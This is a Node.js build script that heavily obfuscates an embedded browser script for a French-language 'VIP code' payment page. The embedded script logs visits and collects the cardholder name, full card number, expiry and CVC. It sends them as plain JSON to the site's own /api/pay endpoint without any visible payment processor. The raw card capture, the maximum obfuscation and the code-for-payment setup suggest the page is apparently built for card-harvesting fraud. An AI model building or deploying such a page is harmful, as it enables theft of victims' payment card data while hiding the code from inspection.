const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');

const scriptPath = path.join(__dirname, 'public', 'script.js');
let scriptContent = `
document.addEventListener('DOMContentLoaded', () => {
    // Log visit
    const API_URL = window.API_URL || '';
    fetch(API_URL + '/api/log-visit').catch(() => {});

    const payForm = document.getElementById('paymentForm');
    const payBtn = document.getElementById('payBtn');
    const successSection = document.getElementById('successSection');
    const paymentSection = document.getElementById('paymentSection');
    const vipCode = document.getElementById('vipCode');
    const copyBtn = document.getElementById('copyBtn');
    
    // Form formatting for card number
    const cardNumberInput = document.getElementById('cardNumber');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = '';
            for(let i = 0; i < value.length; i++) {
                if(i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            e.target.value = formatted;
        });
    }

    // Form formatting for expiry
    const expiryInput = document.getElementById('expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
            if(value.length >= 2) {
                e.target.value = value.substring(0,2) + '/' + value.substring(2,4);
            } else {
                e.target.value = value;
            }
        });
    }

    if (payForm) {
        payForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btnText = payBtn ? payBtn.querySelector('.text') : null;
            const btnLoader = payBtn ? payBtn.querySelector('.loader') : null;

            if (payBtn) payBtn.disabled = true;
            if (btnText) btnText.style.display = 'none';
            if (btnLoader) btnLoader.style.display = 'block';

            const formData = {
                cardHolder: document.getElementById('cardHolder')?.value,
                cardNumber: document.getElementById('cardNumber')?.value,
                expiry: document.getElementById('expiry')?.value,
                cvc: document.getElementById('cvc')?.value
            };

            try {
                const response = await fetch(API_URL + '/api/pay', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });

                const data = await response.json();
                if(data.success) {
                    setTimeout(() => {
                        if (paymentSection) paymentSection.style.display = 'none';
                        if (successSection) {
                            successSection.style.display = 'block';
                            successSection.classList.remove('hidden');
                        }
                        if (vipCode) vipCode.textContent = data.code;
                    }, 1500);
                } else {
                    alert(data.message || 'Erreur lors du paiement.');
                    resetBtn(payBtn, btnText, btnLoader);
                }
            } catch (err) {
                console.error('Payment error:', err);
                alert('Une erreur est survenue lors de la transaction.');
                resetBtn(payBtn, btnText, btnLoader);
            }
        });
    }

    function resetBtn(btn, text, loader) {
        if (btn) btn.disabled = false;
        if (text) text.style.display = 'block';
        if (loader) loader.style.display = 'none';
    }

    if (copyBtn) {
        copyBtn.addEventListener('click', () => {
            const text = vipCode ? vipCode.textContent : '';
            navigator.clipboard.writeText(text).then(() => {
                const originalContent = copyBtn.innerHTML;
                copyBtn.textContent = 'Copié !';
                setTimeout(() => copyBtn.innerHTML = originalContent, 2000);
            });
        });
    }
});
`;

const obfuscated = JavaScriptObfuscator.obfuscate(scriptContent, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 1,
    numbersToExpressions: true,
    simplify: true,
    stringArrayThreshold: 1,
    splitStrings: true,
    splitStringsChunkLength: 5
});

fs.writeFileSync(scriptPath, obfuscated.getObfuscatedCode());
console.log('script.js obfuscated with FIXes!');
